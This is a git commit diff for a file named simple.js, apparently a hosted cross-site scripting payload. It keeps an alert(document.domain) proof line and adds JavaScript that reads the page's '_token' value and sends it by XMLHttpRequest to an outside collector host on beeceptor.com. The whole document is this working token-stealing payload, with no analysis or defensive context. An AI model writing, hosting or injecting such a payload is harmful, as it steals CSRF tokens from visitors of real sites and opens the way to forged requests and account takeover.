44c07b3ef362bdb1983133c0e8698c0546904eca
muhammed1rfan <65807316+muhammed1rfan@users.noreply.github.com>
2021-09-19 19:33:06 +0530

    Update simple.js

--- simple.js
+++ simple.js
@@ -1,1 +1,3 @@
-alert(document.domain)
+alert(document.domain);
+
+x=new XMLHttpRequest();x.open('GET','https://irfan.free.beeceptor.com/?q='+document.getElementsByName("_token")[0].value);x.send();
